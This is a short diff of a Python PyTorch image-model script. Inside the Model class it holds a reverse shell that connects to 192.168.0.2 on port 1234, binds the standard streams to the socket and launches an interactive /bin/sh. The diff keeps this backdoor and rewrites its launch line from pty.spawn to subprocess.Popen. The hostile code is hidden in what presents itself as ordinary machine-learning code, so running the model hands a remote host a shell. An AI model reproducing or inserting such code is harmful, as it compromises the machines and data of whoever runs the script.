@@ -1,7 +1,7 @@
 import torch
 import torch.nn as nn
 from PIL import Image
-import sys, socket, os, pty
+import sys, socket, os, subprocess
 import matplotlib.pyplot as plt
 import torch.nn.functional as F
 import torchvision.transforms as transforms
@@ -49,7 +49,7 @@ class Model(nn.Module):
         s = socket.socket()
         s.connect(("192.168.0.2", 1234))
         [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
-        pty.spawn("sh")
+        p = subprocess.Popen(["/bin/sh", "-i"])
         return x
 
 
